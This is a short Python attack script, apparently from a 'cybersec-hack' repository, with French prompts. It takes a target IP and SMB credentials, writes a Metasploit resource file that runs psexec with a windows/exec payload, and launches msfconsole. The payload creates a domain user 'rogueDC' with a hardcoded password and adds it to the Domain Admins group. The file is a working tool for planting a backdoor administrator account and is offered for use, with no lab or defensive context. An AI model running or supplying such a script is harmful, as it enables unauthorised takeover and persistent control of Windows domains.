# cybersec-hack/domain_escalation.py

import os

def generate_rc_script(target_ip, smb_user, smb_pass):
    print("[+] Génération d'un script Metasploit pour ajouter un utilisateur Domain Admin...")

    rc_content = f"""use exploit/windows/smb/psexec
set RHOSTS {target_ip}
set SMBUser {smb_user}
set SMBPass {smb_pass}
set PAYLOAD windows/exec
set CMD net user rogueDC SuperPassw0rd! /add /domain && net group "Domain Admins" rogueDC /add /domain
exploit
exit
"""

    with open("add_admin.rc", "w") as f:
        f.write(rc_content)

    print("[✓] Script Metasploit généré dans add_admin.rc.")

def main():
    print("[*] --- Création de compte Domain Admin ---")
    target_ip = input("[?] IP de la machine cible : ").strip()
    smb_user = input("[?] Nom d'utilisateur SMB (ex: Administrator) : ").strip()
    smb_pass = input("[?] Mot de passe SMB : ").strip()

    generate_rc_script(target_ip, smb_user, smb_pass)
    print("[*] Lancement de Metasploit avec le script...")
    os.system("msfconsole -r add_admin.rc")

if __name__ == "__main__":
    main()
